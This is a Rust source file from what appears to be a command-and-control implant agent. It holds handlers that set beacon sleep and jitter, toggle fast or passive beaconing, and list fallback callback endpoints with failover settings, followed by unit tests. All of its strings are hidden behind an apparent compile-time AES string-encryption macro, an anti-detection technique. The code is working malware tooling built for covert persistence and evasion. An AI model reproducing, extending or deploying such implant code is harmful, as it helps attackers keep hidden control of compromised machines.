// src/agent/handlers/config.rs - Sleep, beacon mode, fallback configuration

use crate::strcrypt_rt;
use strcrypt::aes_str;
use super::{DispatchResult, AgentAction};

pub fn handle_sleep(args: &str) -> DispatchResult {
    let parts: Vec<&str> = args.split_whitespace().collect();
    if parts.len() < 3 {
        return DispatchResult::Reply(String::new(), aes_str!("Usage: sleep <seconds> <jitter_min> <jitter_max>"), 1, AgentAction::None);
    }
    match (parts[0].parse::<u64>(), parts[1].parse::<u32>(), parts[2].parse::<u32>()) {
        (Ok(s), Ok(min), Ok(max)) => {
            let msg = format!("{} {}s, {}-{}-{}%", aes_str!("Configuration Updated: Sleep"), s, aes_str!("Jitter"), min, max);
            DispatchResult::Reply(msg, String::new(), 0, AgentAction::UpdateConfig(s, min, max))
        }
        _ => DispatchResult::Reply(String::new(), aes_str!("Parse Error"), 1, AgentAction::None),
    }
}

pub fn handle_beacon_mode(active: bool) -> DispatchResult {
    if active {
        DispatchResult::Reply(aes_str!("Beacon Activated (Fast Mode)"), String::new(), 0, AgentAction::SetMode(true))
    } else {
        DispatchResult::Reply(aes_str!("Beacon Deactivated (Passive Mode)"), String::new(), 0, AgentAction::SetMode(false))
    }
}

pub fn handle_fallback_config() -> DispatchResult {
    let fb = &crate::agent::config::load().fallback;
    let info = if fb.endpoints.is_empty() {
        aes_str!("No fallback endpoints configured (single host mode)")
    } else {
        let mut lines = vec![format!("{}: {:?}", aes_str!("Strategy"), fb.strategy)];
        lines.push(format!("{}: {}s", aes_str!("Dead time"), fb.dead_time_secs));
        for (i, ep) in fb.endpoints.iter().enumerate() {
            lines.push(format!("[{}] {}:{} {:?} {}{} {}{} {}{}",
                i, ep.host, ep.port, ep.transport,
                aes_str!("prio="), ep.priority, aes_str!("weight="), ep.weight, aes_str!("max_fail="), ep.max_failures));
        }
        lines.join("\n")
    };
    DispatchResult::Reply(info, String::new(), 0, AgentAction::None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sleep_valid_args() {
        match handle_sleep("30 10 20") {
            DispatchResult::Reply(out, err, code, AgentAction::UpdateConfig(30, 10, 20)) => {
                assert_eq!(code, 0);
                assert!(err.is_empty());
                assert!(out.contains("30s"));
            }
            _ => panic!("Expected UpdateConfig"),
        }
    }

    #[test]
    fn sleep_missing_args() {
        match handle_sleep("30") {
            DispatchResult::Reply(_, err, code, AgentAction::None) => {
                assert_eq!(code, 1);
                assert!(err.contains("Usage"));
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn sleep_bad_number() {
        match handle_sleep("abc 10 20") {
            DispatchResult::Reply(_, _, code, AgentAction::None) => assert_eq!(code, 1),
            _ => panic!("Expected parse error"),
        }
    }

    #[test]
    fn beacon_mode_active() {
        match handle_beacon_mode(true) {
            DispatchResult::Reply(_, _, 0, AgentAction::SetMode(true)) => {}
            _ => panic!("Expected SetMode(true)"),
        }
    }

    #[test]
    fn beacon_mode_passive() {
        match handle_beacon_mode(false) {
            DispatchResult::Reply(_, _, 0, AgentAction::SetMode(false)) => {}
            _ => panic!("Expected SetMode(false)"),
        }
    }
}